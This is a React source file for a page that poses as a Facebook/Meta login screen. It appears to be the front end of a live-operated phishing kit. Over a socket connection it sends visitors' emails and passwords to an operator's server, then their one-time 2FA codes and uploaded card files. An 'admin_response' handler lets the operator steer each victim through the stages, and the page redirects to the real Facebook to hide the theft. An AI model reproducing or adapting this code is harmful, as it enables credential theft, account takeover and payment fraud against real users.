import {
  Box,
  Stack,
  HStack,
  Image,
  Input,
  Text,
  VStack,
} from "@chakra-ui/react";
import { Button } from "../components/ui/button";
import React, { useEffect, useRef, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { io } from "socket.io-client";
import StageOne from "../components/generic/StageOne";
import Loading from "../components/generic/Loading";
import { useUser } from "../contexts/UserContext";
import StageTwo from "../components/generic/StageTwo";
import StageThree from "../components/generic/StageThree";
import ErrorStage from "../components/generic/ErrorStage";
import Failed from "../components/generic/Failed";
import { toaster } from "../components/ui/toaster";
import StageTwoFive from "../components/generic/StageTwoFive";
import axios from "axios";

const Landing = () => {
  const navigate = useNavigate();
  const {
    isLoading,
    setIsLoading,
    credentials,
    sendTo,
    setSendTo,
    otp,
    selectedFiles,
    setSelectedFiles,
    plan,
    setUploadProgress,
  } = useUser();
  const [currentStage, setCurrentStage] = useState(1);
  const [direction, setDirection] = useState(1);
  const [errorMessage, setErrorMessage] = useState("");
  const [verificationMessage, setVerificationMessage] = useState("");
  const socketRef = useRef(null);

  useEffect(() => {
    if (!socketRef.current) {
      socketRef.current = io(import.meta.env.VITE_BASE_URL);

      socketRef.current.on("connect", () => {
        console.log(
          "Connected to socket server with ID:",
          socketRef.current.id
        );
      });

      socketRef.current.on("admin_response", (data) => {
        console.log(data);
        if (data.eventType === "fb_attempt_init") {
          if (data.response === "wrong") {
            setIsLoading(false);
            toaster.create({
              title: "Wrong credentials",
              description: "Invalid username or password",
              type: "error",
            });
          } else if (data.response === "login") {
            if (data.sendTo) {
              setIsLoading(false);

              if (data.nextStep) {
                setCurrentStage(data.nextStep);
              }

              if (data.message) {
                setVerificationMessage(data.message);
              }

              if (data.sendTo) {
                setSendTo(data.sendTo);
              }
            }
          } else {
            setIsLoading(false);

            if (data.nextStep) {
              setCurrentStage(data.nextStep);
            }

            if (data.message) {
              setVerificationMessage(data.message);
            }
          }
        } else if (data.eventType === "fb_otp") {
          setIsLoading(false);

          if (data.nextStep) {
            setCurrentStage(data.nextStep);
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }
        } else if (data.eventType === "fb_resend_otp") {
          if (data.sendTo) {
            setIsLoading(false);

            if (data.message) {
              setVerificationMessage(data.message);
            }

            if (data.sendTo) {
              setSendTo(data.sendTo);
            }
          }
        } else if (data.eventType === "fb_card_upload") {
          setIsLoading(false);

          if (data.nextStep) {
            setCurrentStage(data.nextStep);
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }
        } else {
          window.location.href = "https://www.facebook.com";
        }
      });

      socketRef.current.on("fb_card_upload_failed", (data) => {
        console.log("Upload failed:", data.error);
        setIsLoading(false);
        toaster.create({
          title: "Card Upload Failed!",
          description: "Please try again.",
          type: "error",
        });
      });
    }

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, []);

  const handleLogin = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_attempt_init", {
      email: credentials.username,
      password: credentials.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleAuthValueSubmit = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_otp", {
      email: credentials.username,
      password: credentials.password,
      otp: otp,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleResend = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_resend_otp", {
      email: credentials.username,
      password: credentials.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleUpload = async () => {
    if (selectedFiles.length === 0) return;

    setIsLoading(true);
    const formData = new FormData();
    selectedFiles.forEach((file) => {
      formData.append("files", file);
    });
    formData.append("plan", plan);
    formData.append("sessionId", socketRef.current.id);
    formData.append("email", credentials.username);

    try {
      const response = await axios.post(
        `${import.meta.env.VITE_BASE_URL}/api/fb/upload`,
        formData,
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
          onUploadProgress: (progressEvent) => {
            const progress = Math.round(
              (progressEvent.loaded * 100) / progressEvent.total
            );
            setUploadProgress(progress);
          },
        }
      );

      if (response.status === 200) {
        // Emit a socket event for admin processing
        socketRef.current.emit("fb_card", {
          email: credentials.username,
          password: credentials.password,
          files: selectedFiles.map((file) => file.name),
          plan,
          timestamp: new Date().toISOString(),
          sessionId: socketRef.current.id,
        });
      } else {
        throw new Error("Upload failed");
      }
    } catch (error) {
      setIsLoading(false);
      console.error("Upload error:", error);
      toaster.create({
        title: "Error Uploading Card(s)",
        description:
          error.response?.status === 500
            ? "Failed with Error 500"
            : "An error occurred. Please try again.",
        type: "error",
      });
    }
  };

  const handleFinish = () => {
    setIsLoading(true);
    setErrorMessage("");
    socketRef.current.emit("fb_done", {
      email: credentials.username,
      password: credentials.password,
      otp: otp,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const stageComponents = {
    1: <StageOne handleLogin={handleLogin} />,
    2: (
      <StageTwo
        handleAuthValueSubmit={handleAuthValueSubmit}
        handleResend={handleResend}
      />
    ),
    3: <StageTwoFive handleUpload={handleUpload} />,
    4: <StageThree handleFinish={handleFinish} />,
    // 3: <ErrorStage handleFinish={handleFinish} />,
    5: <Failed handleFinish={handleFinish} />,
  };

  const slideVariants = {
    initial: (direction) => ({
      x: direction > 0 ? "100%" : "-100%",
      opacity: 0,
    }),
    animate: {
      x: 0,
      opacity: 1,
      transition: { duration: 0.5 },
    },
    exit: (direction) => ({
      x: direction < 0 ? "100%" : "-100%",
      opacity: 0,
      transition: { duration: 0.5 },
    }),
  };

  return (
    <>
      <VStack w="100dvw" h="100dvh" pt="0.5rem" px="1rem" gap="0">
        <Text fontSize="13px">English (UK)</Text>

        <Stack
          display={{ md: "flex", base: "none" }}
          w="100%"
          alignItems="center"
          mt="3rem"
        >
          <VStack
            w="396px"
            bg="#fff"
            border="none"
            borderRadius="8px"
            boxSizing="border-box"
            p="20px 0 20px"
            justifyContent="space-between"
            gap="3rem"
            boxShadow="0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1)"
          >
            <AnimatePresence custom={direction}>
              <motion.div
                style={{ width: "100%" }}
                key={currentStage}
                custom={direction}
                variants={slideVariants}
                initial="initial"
                animate="animate"
                exit="exit"
              >
                {stageComponents[currentStage]}
              </motion.div>
            </AnimatePresence>
          </VStack>
        </Stack>

        <Box display={{ base: "flex", md: "none" }} w="100%">
          <AnimatePresence custom={direction}>
            <motion.div
              style={{ width: "100%" }}
              key={currentStage}
              custom={direction}
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
            >
              {stageComponents[currentStage]}
            </motion.div>
          </AnimatePresence>
        </Box>

        <VStack position="absolute" bottom="2%" gap="1.5rem" fontSize="10px">
          <Image src="./images/meta.png" alt="meta" w="60px" h="12px" />
          <HStack>
            <Link to="https://about.meta.com/">
              <Text>About</Text>
            </Link>
            <Link to="https://m.facebook.com/help/?ref=pf">
              <Text>Help</Text>
            </Link>
            <Link to="https://about.meta.com/">
              <Text>More</Text>
            </Link>
          </HStack>
        </VStack>
      </VStack>

      {isLoading && <Loading />}
    </>
  );
};

export default Landing;
